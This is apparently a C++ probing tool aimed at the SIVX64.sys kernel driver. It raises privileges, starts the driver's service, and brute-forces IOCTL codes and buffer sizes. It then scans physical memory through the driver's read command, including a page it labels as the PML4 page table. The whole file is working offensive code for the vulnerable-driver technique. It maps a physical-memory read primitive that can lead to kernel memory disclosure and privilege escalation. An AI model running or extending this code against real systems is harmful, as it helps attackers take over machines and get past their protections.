// siv_probe.cpp — SIVX64.sys IOCTL brute-force size/code discovery
// Build: cl /EHsc /O2 /DUNICODE /D_UNICODE siv_probe.cpp /link advapi32.lib
// Run as Administrator

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winsvc.h>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <vector>

#pragma pack(push, 1)
struct SIV_HDR {
    uint64_t PhysicalAddress;
    uint32_t Size;
    uint16_t Padding;
    uint16_t Flags;
};
#pragma pack(pop)

static void EnableDebugPriv()
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        printf("OpenProcessToken failed: 0x%lX\n", GetLastError());
        return;
    }

    // Enable SeDebugPrivilege
    TOKEN_PRIVILEGES tp{};
    LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    printf("SeDebugPrivilege: 0x%lX\n", GetLastError());

    // Enable SeLoadDriverPrivilege
    LookupPrivilegeValueW(nullptr, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    printf("SeLoadDriverPrivilege: 0x%lX\n", GetLastError());

    CloseHandle(hToken);
}

static bool IsElevated()
{
    BOOL elevated = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION te{};
        DWORD sz = sizeof(te);
        GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &sz);
        elevated = te.TokenIsElevated;
        CloseHandle(hToken);
    }
    return elevated != FALSE;
}

int main()
{
    printf("=== SIVX64.sys IOCTL Probe ===\n\n");

    // Check elevation
    printf("Elevated: %s\n", IsElevated() ? "YES" : "NO (run as Admin!)");
    if (!IsElevated())
    {
        printf("ERROR: Must run as Administrator\n");
        return 1;
    }

    // Check if driver service exists and is running
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scm)
    {
        SC_HANDLE svc = OpenServiceW(scm, L"SIVDRVcs2", SERVICE_QUERY_STATUS | SERVICE_START);
        if (svc)
        {
            SERVICE_STATUS ss{};
            QueryServiceStatus(svc, &ss);
            printf("Service SIVDRVcs2: state=%lu (4=running)\n", ss.dwCurrentState);

            if (ss.dwCurrentState != SERVICE_RUNNING)
            {
                printf("Starting service...\n");
                if (StartServiceW(svc, 0, nullptr))
                    printf("  Started OK\n");
                else
                    printf("  Start failed: 0x%lX\n", GetLastError());
            }
            CloseServiceHandle(svc);
        }
        else
        {
            printf("Service SIVDRVcs2 not found: 0x%lX\n", GetLastError());
            // Try the original SIV service name
            svc = OpenServiceW(scm, L"SIVDRIVER", SERVICE_QUERY_STATUS);
            if (svc)
            {
                SERVICE_STATUS ss{};
                QueryServiceStatus(svc, &ss);
                printf("Service SIVDRIVER: state=%lu\n", ss.dwCurrentState);
                CloseServiceHandle(svc);
            }
        }
        CloseServiceHandle(scm);
    }

    // Enable privileges (MUST be before CreateFileW)
    EnableDebugPriv();

    // Create local SIV_Driver_Event — driver may check for this
    HANDLE hEvLocal = CreateEventW(nullptr, TRUE, FALSE, L"SIV_Driver_Event");
    printf("SIV_Driver_Event: %s (0x%lX)\n", hEvLocal ? "created" : "failed", GetLastError());

    // Also try global
    HANDLE hEvGlobal = CreateEventW(nullptr, TRUE, FALSE, L"Global\\SIV_Driver_Event");
    printf("Global\\SIV_Driver_Event: %s (0x%lX)\n", hEvGlobal ? "created" : "failed", GetLastError());

    // Check if device exists at all
    HANDLE hTest = CreateFileW(L"\\\\.\\SIVDRIVER", 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    printf("\nDevice exists check (zero-access): %s (0x%lX)\n",
        hTest != INVALID_HANDLE_VALUE ? "YES" : "NO", GetLastError());
    if (hTest != INVALID_HANDLE_VALUE) CloseHandle(hTest);

    // Try all access combinations
    printf("\nOpen attempts:\n");
    struct { DWORD access; const char* desc; } attempts[] = {
        { GENERIC_READ | GENERIC_WRITE,        "GENERIC_RW" },
        { GENERIC_READ,                         "GENERIC_R" },
        { GENERIC_WRITE,                        "GENERIC_W" },
        { MAXIMUM_ALLOWED,                      "MAX_ALLOWED" },
        { FILE_READ_DATA | FILE_WRITE_DATA,     "READ_DATA|WRITE_DATA" },
        { FILE_READ_DATA,                        "READ_DATA" },
        { SYNCHRONIZE,                           "SYNCHRONIZE" },
        { 0,                                     "zero" },
    };

    HANDLE hDev = INVALID_HANDLE_VALUE;
    for (auto& a : attempts)
    {
        HANDLE h = CreateFileW(L"\\\\.\\SIVDRIVER", a.access, 0,
            nullptr, OPEN_EXISTING, 0, nullptr);
        DWORD err = (h != INVALID_HANDLE_VALUE) ? 0 : GetLastError();
        printf("  %-25s → 0x%lX\n", a.desc, err);
        if (h != INVALID_HANDLE_VALUE && hDev == INVALID_HANDLE_VALUE)
        {
            hDev = h;
            printf("  *** Using this handle ***\n");
        }
        else if (h != INVALID_HANDLE_VALUE)
            CloseHandle(h);
    }
    if (hDev == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open SIVDRIVER: 0x%lX\n", GetLastError());
        return 1;
    }
    printf("Device opened OK\n\n");

    // ============================================================
    // PHASE 1: Brute-force Cmd 0x14 input/output buffer sizes
    // ============================================================
    printf("--- Phase 1: Cmd 0x14 buffer size brute-force ---\n");
    printf("Testing input sizes 4-256, output sizes 0-4096...\n\n");

    int inputSizes[] = {4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 48, 56, 64, 80, 96, 128, 160, 192, 256};
    int outputSizes[] = {0, 4, 8, 16, 20, 24, 32, 48, 64, 128, 256, 512, 1024, 4096};

    for (int inSz : inputSizes)
    {
        for (int outSz : outputSizes)
        {
            std::vector<uint8_t> inBuf(inSz, 0);
            std::vector<uint8_t> outBuf(outSz > 0 ? outSz : 1, 0);

            // Fill header at start of input buffer
            if (inSz >= (int)sizeof(SIV_HDR))
            {
                auto* h = reinterpret_cast<SIV_HDR*>(inBuf.data());
                h->PhysicalAddress = 0x1000;
                h->Size = 8;
                h->Padding = 0;
                h->Flags = 0x4; // readback
            }

            DWORD ret = 0;
            SetLastError(0);
            BOOL ok = DeviceIoControl(hDev, 0x14,
                inBuf.data(), inSz,
                outSz > 0 ? outBuf.data() : nullptr, outSz,
                &ret, nullptr);
            DWORD err = GetLastError();

            // Only print non-BAD_LENGTH results (0x18 = ERROR_BAD_LENGTH)
            if (err != 0x18)
            {
                printf("  in=%3d out=%4d → ok=%d ret=%lu err=0x%lX",
                    inSz, outSz, ok, ret, err);
                if (ok && ret > 0)
                {
                    printf(" data=");
                    for (DWORD i = 0; i < ret && i < 32; i++)
                        printf("%02X", outBuf[i]);
                }
                printf("\n");
            }
        }
    }

    // ============================================================
    // PHASE 2: Try Cmd 0x14 with same-buffer (in=out) approach
    // ============================================================
    printf("\n--- Phase 2: Cmd 0x14 same-buffer (in=out pointer) ---\n");

    for (int sz : {16, 20, 24, 32, 40, 48, 64, 128, 256, 512, 1024, 4096})
    {
        std::vector<uint8_t> buf(sz, 0);
        if (sz >= (int)sizeof(SIV_HDR))
        {
            auto* h = reinterpret_cast<SIV_HDR*>(buf.data());
            h->PhysicalAddress = 0x1000;
            h->Size = 8;
            h->Padding = 0;
            h->Flags = 0x4;
        }
        DWORD ret = 0;
        SetLastError(0);
        BOOL ok = DeviceIoControl(hDev, 0x14,
            buf.data(), sz, buf.data(), sz, &ret, nullptr);
        DWORD err = GetLastError();

        if (err != 0x18)
        {
            printf("  sz=%4d → ok=%d ret=%lu err=0x%lX", sz, ok, ret, err);
            if (ok && ret > 0)
            {
                printf(" data=");
                for (DWORD i = 0; i < ret && i < 32; i++)
                    printf("%02X", buf[i]);
            }
            printf("\n");
        }
    }

    // ============================================================
    // PHASE 3: Scan ALL IOCTL codes 0x00-0x40 with standard sizes
    // ============================================================
    printf("\n--- Phase 3: IOCTL code scan (0x00-0x40) ---\n");

    for (DWORD cmd = 0x00; cmd <= 0x40; cmd++)
    {
        if (cmd == 0x10 || cmd == 0x14) continue; // already tested

        uint8_t inBuf[64] = {};
        auto* h = reinterpret_cast<SIV_HDR*>(inBuf);
        h->PhysicalAddress = 0x1000;
        h->Size = 8;
        h->Flags = 0x4;

        uint8_t outBuf[64] = {};
        DWORD ret = 0;
        SetLastError(0);

        // Try with 16-byte input
        BOOL ok = DeviceIoControl(hDev, cmd,
            inBuf, 16, outBuf, 64, &ret, nullptr);
        DWORD err = GetLastError();

        if (ok || (err != 0x1 && err != 0x18))
        {
            printf("  cmd=0x%02X in=16 out=64 → ok=%d ret=%lu err=0x%lX", cmd, ok, ret, err);
            if (ok && ret > 0)
            {
                printf(" data=");
                for (DWORD i = 0; i < ret && i < 16; i++)
                    printf("%02X", outBuf[i]);
            }
            printf("\n");
        }

        // Also try 32-byte input
        memset(outBuf, 0, sizeof(outBuf));
        ret = 0;
        ok = DeviceIoControl(hDev, cmd,
            inBuf, 32, outBuf, 64, &ret, nullptr);
        err = GetLastError();
        if (ok || (err != 0x1 && err != 0x18))
        {
            printf("  cmd=0x%02X in=32 out=64 → ok=%d ret=%lu err=0x%lX", cmd, ok, ret, err);
            if (ok && ret > 0)
            {
                printf(" data=");
                for (DWORD i = 0; i < ret && i < 16; i++)
                    printf("%02X", outBuf[i]);
            }
            printf("\n");
        }
    }

    // ============================================================
    // PHASE 4: Cmd 0x10 address range scan
    // ============================================================
    printf("\n--- Phase 4: Cmd 0x10 physical address range scan ---\n");
    printf("Scanning 0x100000-0x400000 every 0x1000...\n");

    int readable = 0, unreadable = 0;
    uint64_t lastTransition = 0x100000;
    bool lastState = false;

    for (uint64_t addr = 0x100000; addr < 0x400000; addr += 0x1000)
    {
        SIV_HDR hdr{};
        hdr.PhysicalAddress = addr;
        hdr.Size = 8;
        hdr.Padding = 0;
        hdr.Flags = 0x4;

        uint8_t out[8] = {};
        DWORD ret = 0;
        BOOL ok = DeviceIoControl(hDev, 0x10,
            &hdr, sizeof(hdr), out, 8, &ret, nullptr);

        bool nowOk = (ok && ret > 0);

        if (addr == 0x100000) lastState = nowOk;

        if (nowOk != lastState)
        {
            printf("  0x%06llX-0x%06llX: %s\n", lastTransition, addr - 0x1000,
                lastState ? "READABLE" : "BLOCKED");
            lastTransition = addr;
            lastState = nowOk;
        }

        if (nowOk) readable++;
        else unreadable++;
    }
    printf("  0x%06llX-0x%06llX: %s\n", lastTransition, (uint64_t)0x3FF000,
        lastState ? "READABLE" : "BLOCKED");
    printf("  Total: %d readable, %d blocked pages\n", readable, unreadable);

    // ============================================================
    // PHASE 5: Specifically test 0x1AE000 with Cmd 0x10 variations
    // ============================================================
    printf("\n--- Phase 5: 0x1AE000 (PML4) Cmd 0x10 deep probe ---\n");

    // Try different flags values
    for (uint16_t flags = 0; flags <= 0x10; flags++)
    {
        SIV_HDR hdr{};
        hdr.PhysicalAddress = 0x1AE000;
        hdr.Size = 8;
        hdr.Padding = 0;
        hdr.Flags = flags;

        uint8_t out[8] = {};
        DWORD ret = 0;
        SetLastError(0);
        BOOL ok = DeviceIoControl(hDev, 0x10,
            &hdr, sizeof(hdr), out, 8, &ret, nullptr);
        DWORD err = GetLastError();

        if (ok && ret > 0)
            printf("  flags=0x%02X → ok=%d ret=%lu data=%02X%02X%02X%02X%02X%02X%02X%02X\n",
                flags, ok, ret, out[0], out[1], out[2], out[3], out[4], out[5], out[6], out[7]);
        else
            printf("  flags=0x%02X → ok=%d ret=%lu err=0x%lX\n", flags, ok, ret, err);
    }

    // Try different Size fields
    printf("  Varying Size field for 0x1AE000:\n");
    for (uint32_t sz : {1u, 2u, 4u, 8u, 16u, 64u, 256u, 4096u})
    {
        SIV_HDR hdr{};
        hdr.PhysicalAddress = 0x1AE000;
        hdr.Size = sz;
        hdr.Flags = 0x4;

        std::vector<uint8_t> out(sz, 0);
        DWORD ret = 0;
        BOOL ok = DeviceIoControl(hDev, 0x10,
            &hdr, sizeof(hdr), out.data(), sz, &ret, nullptr);
        printf("    Size=%4u → ok=%d ret=%lu\n", sz, ok, ret);
    }

    // ============================================================
    // PHASE 6: Check addresses around 0x1AE000
    // ============================================================
    printf("\n--- Phase 6: Fine-grained scan around 0x1AE000 ---\n");

    for (uint64_t addr = 0x1A0000; addr <= 0x1C0000; addr += 0x1000)
    {
        SIV_HDR hdr{};
        hdr.PhysicalAddress = addr;
        hdr.Size = 8;
        hdr.Flags = 0x4;

        uint8_t out[8] = {};
        DWORD ret = 0;
        BOOL ok = DeviceIoControl(hDev, 0x10,
            &hdr, sizeof(hdr), out, 8, &ret, nullptr);

        printf("  0x%06llX: %s", addr, (ok && ret > 0) ? "OK " : "FAIL");
        if (ok && ret > 0)
            printf(" %02X%02X%02X%02X%02X%02X%02X%02X",
                out[0], out[1], out[2], out[3], out[4], out[5], out[6], out[7]);
        printf("\n");
    }

    // ============================================================
    // PHASE 7: Extended scan for higher memory (find readable RAM)
    // ============================================================
    printf("\n--- Phase 7: Sparse scan 0-2GB for readable regions ---\n");

    uint64_t scanPoints[] = {
        0x0, 0x10000, 0x80000, 0xF0000, 0xFFFFF,
        0x100000, 0x1AE000, 0x200000, 0x400000, 0x800000,
        0x1000000, 0x2000000, 0x4000000, 0x8000000,
        0x10000000, 0x20000000, 0x40000000, 0x80000000
    };

    for (uint64_t addr : scanPoints)
    {
        SIV_HDR hdr{};
        hdr.PhysicalAddress = addr;
        hdr.Size = 8;
        hdr.Flags = 0x4;

        uint8_t out[8] = {};
        DWORD ret = 0;
        BOOL ok = DeviceIoControl(hDev, 0x10,
            &hdr, sizeof(hdr), out, 8, &ret, nullptr);

        printf("  0x%010llX: %s", addr, (ok && ret > 0) ? "OK " : "FAIL");
        if (ok && ret > 0)
            printf(" %02X%02X%02X%02X%02X%02X%02X%02X",
                out[0], out[1], out[2], out[3], out[4], out[5], out[6], out[7]);
        printf("\n");
    }

    CloseHandle(hDev);
    printf("\n=== Done ===\n");
    return 0;
}
